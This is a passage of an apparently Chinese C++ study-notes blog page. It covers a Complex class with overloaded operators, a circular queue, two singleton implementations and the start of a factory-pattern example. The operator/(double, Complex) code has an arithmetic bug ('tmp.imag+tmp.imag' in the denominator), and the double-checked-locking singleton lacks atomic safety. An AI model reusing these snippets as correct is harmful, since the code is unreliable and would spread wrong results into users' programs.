class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br></pre></td><td class="code"><pre><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class Complex</span><br><span class="line">&#123;</span><br><span class="line">   private:</span><br><span class="line">     double real;</span><br><span class="line">     double imag;</span><br><span class="line">   public:</span><br><span class="line">     Complex()&#123;real=0;imag=1;&#125;</span><br><span class="line">     Complex(double r,double i):real(r),imag(i)&#123;&#125;</span><br><span class="line">     Complex(const Complex &amp;tmp):real(tmp.real),imag(tmp.imag)&#123;&#125;</span><br><span class="line">     void set_real(double r);</span><br><span class="line">     void set_imag(double i);</span><br><span class="line">     void set_complex(double r,double i);</span><br><span class="line">     double get_real() const;</span><br><span class="line">     double get_imag() const;</span><br><span class="line">     Complex&amp; operator+=(const Complex &amp;tmp);</span><br><span class="line">     Complex&amp; operator+=(const double r);</span><br><span class="line">     Complex&amp; operator-=(const Complex &amp;tmp);</span><br><span class="line">     Complex&amp; operator-=(const double r);</span><br><span class="line">     Complex&amp; operator=(const Complex &amp;tmp);</span><br><span class="line">     Complex&amp; operator=(const double r);</span><br><span class="line">     bool operator==(const Complex &amp;tmp) const;</span><br><span class="line">     bool operator&gt;=(const Complex &amp;tmp) const;</span><br><span class="line">     bool operator&lt;=(const Complex &amp;tmp) const;</span><br><span class="line">     bool operator!=(const Complex &amp;tmp) const;</span><br><span class="line">     bool operator&gt;(const Complex &amp;tmp) const;</span><br><span class="line">     bool operator&lt;(const Complex &amp;tmp) const;</span><br><span class="line">     double operator!();</span><br><span class="line">     friend Complex operator+(const Complex &amp;tmp,const Complex &amp;temp);</span><br><span class="line">     friend Complex operator+(const Complex &amp;tmp,const double r);</span><br><span class="line">     friend Complex operator+(const double r,const Complex &amp;tmp);</span><br><span class="line">     friend Complex operator-(const Complex &amp;tmp,const Complex &amp;temp);</span><br><span class="line">     friend Complex operator-(const Complex &amp;tmp,const double r);</span><br><span class="line">     friend Complex operator-(const double r,const Complex &amp;tmp);</span><br><span class="line">     friend Complex operator*(const Complex &amp;tmp,const Complex &amp;temp);</span><br><span class="line">     friend Complex operator*(const Complex &amp;tmp,const double r);</span><br><span class="line">     friend Complex operator*(const double r,const Complex &amp;tmp);</span><br><span class="line">     friend Complex operator/(const Complex &amp;tmp,const Complex &amp;temp);</span><br><span class="line">     friend Complex operator/(const Complex &amp;tmp,const double r);</span><br><span class="line">     friend Complex operator/(const double r,const Complex &amp;tmp);</span><br><span class="line">     friend istream&amp; operator&gt;&gt;(istream &amp;is ,Complex &amp;tmp);</span><br><span class="line">     friend ostream&amp; operator&lt;&lt;(ostream &amp;os,const Complex &amp;tmp);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   Complex p(1,1);</span><br><span class="line">   Complex q(2,2);</span><br><span class="line">   Complex t(3,3);</span><br><span class="line">   double test;</span><br><span class="line"></span><br><span class="line">   cout &lt;&lt; p+q;</span><br><span class="line">   cout &lt;&lt; p-q;</span><br><span class="line">   cout &lt;&lt; p*q ;</span><br><span class="line">   cout &lt;&lt; p/q ;</span><br><span class="line">   test=(!p);</span><br><span class="line">   cout &lt;&lt; test &lt;&lt; endl;</span><br><span class="line">   cout &lt;&lt; (p==q) &lt;&lt; endl;</span><br><span class="line">   cout &lt;&lt; (p!=q) &lt;&lt; endl;</span><br><span class="line">   cout &lt;&lt; (p&gt;=q) &lt;&lt; endl;</span><br><span class="line">   cout &lt;&lt; (p&gt;q) &lt;&lt; endl;</span><br><span class="line">   cout &lt;&lt; (p&lt;q) &lt;&lt; endl;</span><br><span class="line">   cout &lt;&lt; (p&lt;=q) &lt;&lt; endl;</span><br><span class="line">   t+=q;</span><br><span class="line">   cout &lt;&lt; t;</span><br><span class="line">   t-=p;</span><br><span class="line">   cout &lt;&lt; t;</span><br><span class="line">   cout &lt;&lt; 10+p;</span><br><span class="line">   cout &lt;&lt; p+10;</span><br><span class="line">   cout &lt;&lt; 10-p;</span><br><span class="line">   cout &lt;&lt; p-10;</span><br><span class="line">   cout &lt;&lt; 10*p;</span><br><span class="line">   cout &lt;&lt; p*10;</span><br><span class="line">   cout &lt;&lt; 10/p;</span><br><span class="line">   cout &lt;&lt; p/10;</span><br><span class="line">   cin &gt;&gt; t;</span><br><span class="line">   cout &lt;&lt; t;</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Complex::set_real(double r)</span><br><span class="line">&#123;</span><br><span class="line">   real=r;</span><br><span class="line">   return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Complex::set_imag(double i)</span><br><span class="line">&#123;</span><br><span class="line">   imag=i;</span><br><span class="line">   return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Complex::set_complex(double r,double i)</span><br><span class="line">&#123;</span><br><span class="line">   real=r;</span><br><span class="line">   imag=i;</span><br><span class="line">   return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline double Complex::get_real() const</span><br><span class="line">&#123;</span><br><span class="line">    return(real);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline double Complex::get_imag() const</span><br><span class="line">&#123;</span><br><span class="line">   return(imag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex&amp; Complex::operator+=(const Complex&amp; tmp)</span><br><span class="line">&#123;</span><br><span class="line">   real+=tmp.real;</span><br><span class="line">   imag+=tmp.imag;</span><br><span class="line">   return *this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex&amp; Complex::operator+=(double r)</span><br><span class="line">&#123;</span><br><span class="line">   real+=r;</span><br><span class="line">   return *this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex&amp; Complex::operator-=(const Complex&amp; tmp)</span><br><span class="line">&#123;</span><br><span class="line">   real-=tmp.real;</span><br><span class="line">   imag-=tmp.imag;</span><br><span class="line">   return *this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex&amp; Complex::operator-=(double r)</span><br><span class="line">&#123;  </span><br><span class="line">   real-=r;</span><br><span class="line">   return *this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inline Complex&amp; Complex::operator=(const Complex&amp; tmp)</span><br><span class="line">&#123;</span><br><span class="line">   real=tmp.real;</span><br><span class="line">   imag=tmp.imag;</span><br><span class="line">   return *this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex&amp; Complex::operator=(double r)</span><br><span class="line">&#123;</span><br><span class="line">  real=r;</span><br><span class="line">  imag=0;</span><br><span class="line">  return *this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex operator+(const Complex &amp;tmp,const Complex &amp;temp)</span><br><span class="line">&#123;    </span><br><span class="line">   Complex result;</span><br><span class="line">   result.real=tmp.real+temp.real;</span><br><span class="line">   result.imag=tmp.imag+temp.imag;</span><br><span class="line">   return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex operator+(const Complex &amp;tmp,const double r)</span><br><span class="line">&#123;       </span><br><span class="line">   Complex result;</span><br><span class="line">   result.real=tmp.real+r;</span><br><span class="line">   result.imag=tmp.imag;</span><br><span class="line">   return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex operator+(const double r,const Complex &amp;tmp)</span><br><span class="line">&#123;       </span><br><span class="line">   Complex result;</span><br><span class="line">   result.real=r+tmp.real;</span><br><span class="line">   result.imag=tmp.imag;</span><br><span class="line">   return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex operator-(const Complex &amp;tmp,const Complex &amp;temp)</span><br><span class="line">&#123;</span><br><span class="line">   Complex result;</span><br><span class="line">   result.real=tmp.real-temp.real;</span><br><span class="line">   result.imag=tmp.imag-temp.imag;</span><br><span class="line">   return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inline Complex operator-(const Complex &amp;tmp,const double r)</span><br><span class="line">&#123;</span><br><span class="line">    Complex result;</span><br><span class="line">    result.real=tmp.real-r;</span><br><span class="line">    result.imag=tmp.imag;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex operator-(const double r,const Complex &amp;tmp)</span><br><span class="line">&#123;</span><br><span class="line">    Complex result;</span><br><span class="line">    result.real=r-tmp.real;</span><br><span class="line">    result.imag=0-tmp.imag;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex operator*(const Complex &amp;tmp,const Complex&amp; temp)</span><br><span class="line">&#123;</span><br><span class="line">    Complex result;</span><br><span class="line">    result.real=temp.real*tmp.real-temp.imag*tmp.imag;</span><br><span class="line">    result.imag=temp.real*tmp.imag+temp.imag*tmp.real;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex operator*(const Complex &amp;tmp,const double r)</span><br><span class="line">&#123;</span><br><span class="line">    Complex result;</span><br><span class="line">    result.real=tmp.real*r;</span><br><span class="line">    result.imag=tmp.imag*r;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex operator*(const double r,const Complex &amp;tmp)</span><br><span class="line">&#123;</span><br><span class="line">    Complex result;</span><br><span class="line">    result.real=r*tmp.real;</span><br><span class="line">    result.imag=r*tmp.imag;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex operator/(const Complex &amp;tmp,const Complex &amp;temp)</span><br><span class="line">&#123;</span><br><span class="line">    Complex result;</span><br><span class="line">    if(temp.real==0&amp;&amp;temp.imag==0)</span><br><span class="line">    &#123;</span><br><span class="line">       cout &lt;&lt; &quot;error!&quot; &lt;&lt; endl;</span><br><span class="line">       return result;</span><br><span class="line">    &#125;</span><br><span class="line">    result.real=(tmp.real*temp.real+tmp.imag*temp.imag)/(temp.real*temp.real+temp.imag*temp.imag);</span><br><span class="line">    result.imag=(tmp.imag*temp.real-tmp.real*temp.imag)/(temp.real*temp.real+temp.imag*temp.imag);</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex operator/(const Complex &amp;tmp,const double r)</span><br><span class="line">&#123;</span><br><span class="line">   Complex result;</span><br><span class="line">   if(r==0)</span><br><span class="line">   &#123;</span><br><span class="line">      cout &lt;&lt; &quot;error!&quot; &lt;&lt; endl;</span><br><span class="line">      return result;</span><br><span class="line">   &#125;</span><br><span class="line">   result.real=tmp.real/r;</span><br><span class="line">   result.imag=tmp.imag/r;</span><br><span class="line">   return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline Complex operator/(const double r,const Complex &amp;tmp)</span><br><span class="line">&#123;</span><br><span class="line">   Complex result;</span><br><span class="line">   if(tmp.real==0&amp;&amp;tmp.imag==0)</span><br><span class="line">   &#123;</span><br><span class="line">     cout &lt;&lt; &quot;error&quot; &lt;&lt; endl;</span><br><span class="line">     return result;</span><br><span class="line">   &#125;</span><br><span class="line">   result.real=r*tmp.real/(tmp.real*tmp.real+tmp.imag*tmp.imag);</span><br><span class="line">   result.imag=(0-r*tmp.imag)/(tmp.real*tmp.real+tmp.imag+tmp.imag);</span><br><span class="line">   return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline double Complex::operator!()</span><br><span class="line">&#123;</span><br><span class="line">   return sqrt(real*real+imag*imag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline bool Complex::operator==(const Complex &amp;tmp) const</span><br><span class="line">&#123;</span><br><span class="line">   if(real==tmp.real&amp;&amp;imag==tmp.imag)</span><br><span class="line">      return true;</span><br><span class="line">   else</span><br><span class="line">      return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline bool Complex::operator!=(const Complex &amp;tmp) const</span><br><span class="line">&#123;</span><br><span class="line">   if(*this==tmp)</span><br><span class="line">     return false;</span><br><span class="line">   else</span><br><span class="line">     return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline bool Complex::operator&gt;=(const Complex &amp;tmp) const</span><br><span class="line">&#123;</span><br><span class="line">   if((real*real+imag*imag)&gt;=(tmp.real*tmp.real+tmp.imag*tmp.imag))</span><br><span class="line">     return true;</span><br><span class="line">   else</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline bool Complex::operator&gt;(const Complex &amp;tmp) const</span><br><span class="line">&#123;</span><br><span class="line">   if((real*real+imag*imag)&gt;(tmp.real*tmp.real+tmp.imag*tmp.imag))</span><br><span class="line">     return true;</span><br><span class="line">   else</span><br><span class="line">     return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline bool Complex::operator&lt;=(const Complex &amp;tmp) const</span><br><span class="line">&#123;</span><br><span class="line">  if((real*real+imag*imag)&lt;=(tmp.real*tmp.real+tmp.imag*tmp.imag))</span><br><span class="line">     return true;</span><br><span class="line">  else</span><br><span class="line">     return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline bool Complex::operator&lt;(const Complex &amp;tmp) const</span><br><span class="line">&#123;</span><br><span class="line">  if((real*real+imag*imag)&lt;(tmp.real*tmp.real+tmp.imag*tmp.imag))</span><br><span class="line">     return true;</span><br><span class="line">  else</span><br><span class="line">     return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline ostream&amp; operator&lt;&lt;(ostream&amp; os,const Complex&amp; tmp)</span><br><span class="line">&#123;</span><br><span class="line">   os &lt;&lt; tmp.real &lt;&lt; &quot;+&quot; &lt;&lt; tmp.imag &lt;&lt; &quot;j&quot; &lt;&lt; endl;</span><br><span class="line">   return os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline istream&amp; operator&gt;&gt;(istream &amp;is,Complex&amp; tmp)</span><br><span class="line">&#123;</span><br><span class="line">   cout &lt;&lt; &quot;enter real:&quot;;</span><br><span class="line">   is &gt;&gt; tmp.real;</span><br><span class="line">   if(is)</span><br><span class="line">   &#123;</span><br><span class="line">      cout &lt;&lt; &quot;enter imag:&quot;;</span><br><span class="line">      is &gt;&gt; tmp.imag;</span><br><span class="line">      if(is)</span><br><span class="line">      &#123;</span><br><span class="line">        return is;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">         cout &lt;&lt; &quot;error!&quot; &lt;&lt; endl;</span><br><span class="line">      tmp=Complex(0,1);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123;</span><br><span class="line">      tmp=Complex(0,1);</span><br><span class="line">   &#125;</span><br><span class="line">   return is;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自己实现循环队列"><a href="#自己实现循环队列" class="headerlink" title="自己实现循环队列"></a>自己实现循环队列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">循环队列成员变量：</span><br><span class="line">1.一个数据结构保存数组，可以用vector&lt;int&gt; que</span><br><span class="line">2.循环队列的capacity</span><br><span class="line">3.循环队列的头指针</span><br><span class="line">4.循环队列的尾指针</span><br><span class="line">5.循环队列当前的元素数量</span><br><span class="line">注意：front指的是头元素，rear指的是最后一个元素的下一个位置，所以返回Rear需要返回que[(rear-1+capacity)%capacity]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">class MyCircularQueue &#123;</span><br><span class="line">private:</span><br><span class="line">    int m_count;</span><br><span class="line">    int front;</span><br><span class="line">    int rear;</span><br><span class="line">    int m_num;</span><br><span class="line">    vector&lt;int&gt; que;</span><br><span class="line">public:</span><br><span class="line">    MyCircularQueue(int k) &#123;</span><br><span class="line">        m_count=k;</span><br><span class="line">        que=vector&lt;int&gt;(m_count,-1);</span><br><span class="line">        front=0;</span><br><span class="line">        rear=0;</span><br><span class="line">        m_num=0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bool enQueue(int value) &#123;</span><br><span class="line">        if(isFull())</span><br><span class="line">        &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        que[rear]=value;</span><br><span class="line">        rear=(rear+1)%m_count;</span><br><span class="line">        m_num++;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    bool deQueue() &#123;</span><br><span class="line">        if(isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        front=(front+1)%m_count;</span><br><span class="line">        m_num--;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    int Front() &#123;</span><br><span class="line">        if(isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        return que[front];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int Rear() &#123;</span><br><span class="line">        if(isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        return que[(rear-1+m_count)%m_count];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bool isEmpty() &#123;</span><br><span class="line">        return m_num==0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bool isFull() &#123;</span><br><span class="line">        return m_count==m_num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Your MyCircularQueue object will be instantiated and called as such:</span><br><span class="line"> * MyCircularQueue* obj = new MyCircularQueue(k);</span><br><span class="line"> * bool param_1 = obj-&gt;enQueue(value);</span><br><span class="line"> * bool param_2 = obj-&gt;deQueue();</span><br><span class="line"> * int param_3 = obj-&gt;Front();</span><br><span class="line"> * int param_4 = obj-&gt;Rear();</span><br><span class="line"> * bool param_5 = obj-&gt;isEmpty();</span><br><span class="line"> * bool param_6 = obj-&gt;isFull();</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><h1 id="9-设计模式"><a href="#9-设计模式" class="headerlink" title="9.设计模式"></a>9.设计模式</h1><h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><h3 id="1-局部静态变量实现"><a href="#1-局部静态变量实现" class="headerlink" title="1.局部静态变量实现"></a>1.局部静态变量实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class singleton</span><br><span class="line">&#123;</span><br><span class="line">    private:</span><br><span class="line">        singleton()=default;</span><br><span class="line">        singleton(const singleton&amp; sig)=delete;</span><br><span class="line">        singleton&amp; operator=(const singleton&amp; sig)=delete;</span><br><span class="line">    public:</span><br><span class="line">        ~singleton()=default;</span><br><span class="line">        static singleton&amp; getInstance()</span><br><span class="line">        &#123;</span><br><span class="line">            static singleton sigInstance;</span><br><span class="line">            return sigInstance;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    singleton&amp; sig1=singleton::getInstance();</span><br><span class="line">    cout&lt;&lt;&amp;sig1&lt;&lt;endl;</span><br><span class="line">    singleton&amp; sig2=singleton::getInstance();</span><br><span class="line">    cout&lt;&lt;&amp;sig2&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">//二者是同一个地址</span><br></pre></td></tr></table></figure><h3 id="2-双检查锁-Double-check-lock"><a href="#2-双检查锁-Double-check-lock" class="headerlink" title="2.双检查锁(Double-check-lock)"></a>2.双检查锁(Double-check-lock)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;mutex&gt;</span><br><span class="line"></span><br><span class="line">class Singleton &#123;</span><br><span class="line">public:</span><br><span class="line">  static Singleton* GetInstance() &#123;</span><br><span class="line">    if (instance_ == nullptr) &#123;</span><br><span class="line">      std::lock_guard&lt;std::mutex&gt; lock(mutex_);</span><br><span class="line">      if (instance_ == nullptr) &#123;</span><br><span class="line">        instance_ = new Singleton;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return instance_;</span><br><span class="line">  &#125;</span><br><span class="line">  ~Singleton() = default;</span><br><span class="line">  // 释放资源。</span><br><span class="line">  void Destroy() &#123;</span><br><span class="line">    if (instance_ != nullptr) &#123;</span><br><span class="line">      delete instance_;</span><br><span class="line">      instance_ = nullptr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  void PrintAddress() const &#123;</span><br><span class="line">    std::cout &lt;&lt; this &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">  Singleton() = default;</span><br><span class="line">  Singleton(const Singleton&amp;) = delete;</span><br><span class="line">  Singleton&amp; operator=(const Singleton&amp;) = delete;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">  static Singleton* instance_;</span><br><span class="line">  static std::mutex mutex_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Singleton* Singleton::instance_ = nullptr;</span><br><span class="line">std::mutex Singleton::mutex_;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  Singleton* s1 = Singleton::GetInstance();</span><br><span class="line">  s1-&gt;PrintAddress();</span><br><span class="line"></span><br><span class="line">  Singleton* s2 = Singleton::GetInstance();</span><br><span class="line">  s2-&gt;PrintAddress();</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h2><p><img src="https://images2017.cnblogs.com/blog/1176669/201801/1176669-20180108230030082-1100848962.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">enum CarType&#123;BENZ, BMW&#125;;</span><br><span class="line">class Car//车类</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    virtual void createdCar(void) = 0;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class BenzCar : public Car //奔驰车</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    BenzCar()</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;&quot;Benz::Benz()&quot;&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    virtual void createdCar(void)</span><br><span class="line">    